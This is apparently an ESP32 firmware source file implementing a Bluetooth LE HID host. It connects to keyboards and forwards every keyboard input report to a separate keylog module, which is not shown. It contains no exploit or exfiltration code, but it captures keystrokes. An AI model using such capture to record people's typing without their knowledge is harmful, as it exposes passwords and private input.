#include "hid_host.h"

#include <inttypes.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>

#include "esp_err.h"
#include "esp_event.h"
#include "esp_log.h"

#include "esp_hidh.h"
#include "esp_hidh_bluedroid.h"
#include "esp_hidh_gattc.h"

#include "keylog.h"

static const char *TAG = "hid_host";

static esp_hidh_dev_t *s_dev = NULL;
static uint8_t s_last_bda[6] = {0};
static bool s_has_last_bda = false;

static void hidh_event_handler(void *handler_arg, esp_event_base_t base, int32_t id, void *event_data) {
    (void)handler_arg;
    (void)base;

    const esp_hidh_event_t event = (esp_hidh_event_t)id;
    esp_hidh_event_data_t *data = (esp_hidh_event_data_t *)event_data;

    switch (event) {
    case ESP_HIDH_OPEN_EVENT: {
        s_dev = data ? data->open.dev : NULL;
        if (s_dev) {
            const uint8_t *bda = esp_hidh_dev_bda_get(s_dev);
            if (bda) {
                memcpy(s_last_bda, bda, sizeof(s_last_bda));
                s_has_last_bda = true;
            }
            ESP_LOGI(TAG, "open: dev=%p name=%s transport=%d usage=0x%x",
                     (void *)s_dev,
                     esp_hidh_dev_name_get(s_dev) ? esp_hidh_dev_name_get(s_dev) : "(null)",
                     (int)esp_hidh_dev_transport_get(s_dev),
                     (unsigned)esp_hidh_dev_usage_get(s_dev));
            esp_hidh_dev_dump(s_dev, stdout);
        } else {
            ESP_LOGW(TAG, "open: dev=NULL");
        }
        break;
    }

    case ESP_HIDH_INPUT_EVENT: {
        if (!data) break;
        if (data->input.usage != ESP_HID_USAGE_KEYBOARD) {
            break;
        }
        if (data->input.length == 0 || !data->input.data) {
            break;
        }
        keylog_submit_report((uint8_t)data->input.report_id, data->input.data, (uint16_t)data->input.length);
        break;
    }

    case ESP_HIDH_CLOSE_EVENT: {
        esp_hidh_dev_t *dev = data ? data->close.dev : NULL;
        ESP_LOGI(TAG, "close: dev=%p reason=%d", (void *)dev, data ? data->close.reason : -1);
        if (dev) {
            esp_hidh_dev_free(dev);
        }
        if (dev == s_dev) {
            s_dev = NULL;
        }
        break;
    }

    default:
        break;
    }
}

void hid_host_init(void) {
    const esp_hidh_config_t cfg = {
        .callback = hidh_event_handler,
        .event_stack_size = 4096,
        .callback_arg = NULL,
    };

    esp_err_t err = esp_hidh_init(&cfg);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "esp_hidh_init failed: %s", esp_err_to_name(err));
        return;
    }

    ESP_LOGI(TAG, "esp_hidh initialized");
}

bool hid_host_open(const uint8_t bda[6], uint8_t addr_type) {
    if (!bda) return false;

    esp_hidh_dev_t *dev = esp_hidh_dev_open((uint8_t *)bda, ESP_HID_TRANSPORT_BLE, addr_type);
    if (!dev) {
        ESP_LOGE(TAG, "esp_hidh_dev_open failed");
        return false;
    }
    ESP_LOGI(TAG, "open requested: %02x:%02x:%02x:%02x:%02x:%02x addr_type=%u",
             bda[0], bda[1], bda[2], bda[3], bda[4], bda[5], (unsigned)addr_type);
    return true;
}

void hid_host_close(void) {
    if (s_dev) {
        (void)esp_hidh_dev_close(s_dev);
        return;
    }
    if (s_has_last_bda) {
        ESP_LOGI(TAG, "close requested but dev unknown (last bda=%02x:%02x:%02x:%02x:%02x:%02x)",
                 s_last_bda[0], s_last_bda[1], s_last_bda[2], s_last_bda[3], s_last_bda[4], s_last_bda[5]);
    } else {
        ESP_LOGI(TAG, "close requested but no device");
    }
}

void hid_host_forward_gattc_event(int event, int gattc_if, void *param) {
    esp_hidh_gattc_event_handler((esp_gattc_cb_event_t)event, (esp_gatt_if_t)gattc_if, (esp_ble_gattc_cb_param_t *)param);
}
